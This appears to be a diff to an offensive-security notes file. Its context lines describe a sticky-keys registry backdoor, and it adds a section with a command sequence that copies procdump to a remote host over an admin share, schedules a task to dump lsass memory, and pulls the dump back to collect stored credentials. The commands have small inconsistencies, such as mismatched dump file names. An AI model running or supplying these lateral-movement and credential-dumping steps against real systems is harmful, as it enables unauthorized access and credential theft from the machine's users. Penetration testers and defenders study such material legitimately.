@@ -171,3 +171,17 @@ This technique uses registry entries to switch the binary that the sticky keys e
 * For the "Debugger" REG_SZ, make it have a value of your binary
 
 * Press SHIFT 5 times and your binary should be executed
+
+### Process Dumping For Passwords
+If you have access to a server and one of the user's usernames and passwords and can create shares on that computer,
+you may be able to create a scheduled task which runs procdump.exe to dump all of the memory of the lsass process,
+thus gaining access to all of the stored credentials on the targeted computer:
+
+```
+net use \\target server /user:DOM\username password
+copy procdump.exe \\targetserver\c$
+copy procdump.bat \\targetserver\c$
+procdump.exe -ma lsass creds.dump
+at \\targetserver 13:37 C:\procdump.bat
+copy \\targetserver\c$\targetserver.dmp .
+```
